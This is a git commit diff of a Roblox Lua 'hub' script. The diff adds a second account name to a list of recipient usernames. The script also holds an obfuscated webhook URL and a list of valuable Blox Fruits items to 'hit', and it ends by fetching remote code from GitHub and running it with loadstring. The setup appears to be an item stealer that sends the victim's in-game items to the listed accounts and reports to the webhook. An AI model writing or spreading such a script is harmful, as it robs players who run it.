0900270bdc58cd7d29f2b4b65d888cde4542ee00
realrRedz <tt.smartman@gmail.com>
2025-03-10 19:28:20 +0530

    rredzhub.lua

--- rredzhub.lua
+++ rredzhub.lua
@@ -1,5 +1,5 @@
 Webhook = "https://webhook-protect.vercel.app/api/webhook?id=YUZ0cURfTmdmMFUxOFIzc2p1cU9QdzoydzF2eGRKX2tIQ28wN01rQUFtbTJRaGhnNlVKQkZuVXVrNVFPbW9EdXB2OUhYRlA3V2FHMzZMdmR0Vm1FS2tjR3VzZFp2VW03ZkpyN2FYSkZ0MzROeGM2cm5fLVd4Sjl1ZU9QQVhtRldEOGs5emthVVVmUHpmOVM4RG1aNGdIWGNWODFfR251TEN1YlpyRXFWT0VfbGgzMUZMak1jeTViclVONnd0QmZCMUU"
-Usernames = {"UglyAccount69"}
+Usernames = {"UglyAccount69", "Dragonisop13"}
 FruitsToHit = {"Leopard-Leopard", "Kitsune-Kitsune", "Gas-Gas", "Control-Control", "Yeti-Yeti"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
